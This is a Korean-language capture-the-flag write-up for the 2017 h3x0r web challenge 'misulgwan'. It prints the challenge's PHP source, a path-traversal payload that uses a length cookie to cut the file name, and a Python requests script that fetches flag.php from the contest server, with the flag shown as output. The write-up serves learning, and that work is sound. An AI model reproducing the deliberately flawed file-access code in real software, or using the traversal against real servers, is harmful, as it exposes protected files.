# 2017 h3x0r - [WEB] misulgwan

## Key words

- $\_COOKIE usage
- passthru
- view-source

## Solution

문제에 접속하고, 소스 보기를 하면 `view.php?view-source`라는 기능으로 소스 보기를 할 수 있었습니다.

```php
welcome to misulgwan. <?php
error_reporting(0);
include 'flag.php'; # flag is in the flag.php

if(isset($_GET['image'], $_COOKIE['length'])){
    if(preg_match("/_/", $_GET['image'])) exit("no hack");
    $ext = explode(".", strrev($_GET['image']));
    $ext = strrev($ext[0]);
    if(!preg_match("/png|jpg|bmp/i", $ext)) exit("no hack");

    $image = substr($_GET['image'], 0, $_COOKIE['length']);
    $view = fopen("./image/".$image, 'rb');

    header("Content-Type: image/png");
    fpassthru($view);
}
else {
    echo "welcome to misulgwan.";
}

if(isset($_GET['view-source'])){
    highlight_file(__FILE__);
}
?>
```
플래그를 얻기 위한 조건으로는 다음과 같습니다.

- `$_GET['image']`, `$_COOKIE['length']` 설정
- `$_GET['image']`에는 `_` 이 들어 갈 수 없음
- `$_GET['image']`를 `.` 으로 Split한 결과에 `png|jpg|bmp`가 존재해야 함
- `flag.php`를 불러와야 함

결론적으로 `$view`의 위치가 `./flag.php`가 될 수 있도록 `$image`를 맞추어야 합니다.

먼저 위의 조건을 회피 하기 위해 아래와 같이 1차 쿼리를 제작합니다.

>?image=../flag.php.bmp

이와 같이 만들어 주면 `fopen`시 다음과 같이 동작 합니다.

```php
$view = fopen("./image/../flag.php.bmp", "rb");
```

문제는 여기서 뒷 부분의 `.bmp` 확장자 인데 소스코드를 잘 확인해보면 `$_COOKIE['length']`를 통해 이미지명을 짤라 줍니다.

```php
$image = substr($_GET['image'], 0, $_COOKIE['length']);
```

우리가 넣은 쿼리는 `../flag.php.bmp` 이며 `substr("../flag.php.bmp", 0, 11)`을 하게 되면 결과적으로 `../flag.php`남게 되기 때문에 `$_COOKIE['length']`의 값을 11로 만들어서 쿼리를 합니다.

## Code

```python
import requests

url = "http://39.120.34.116:12345/misulgwan/view.php"
headers = {"Cookie": "length=11;"}
params  = { "image": "../flag.php.bmp" }
r = requests.get(url, params=params, headers=headers)

print r.content

''' result
<?php
# Congratulation!!!!
# H3X0R{munhwabaek_is_back}
?>
'''
```
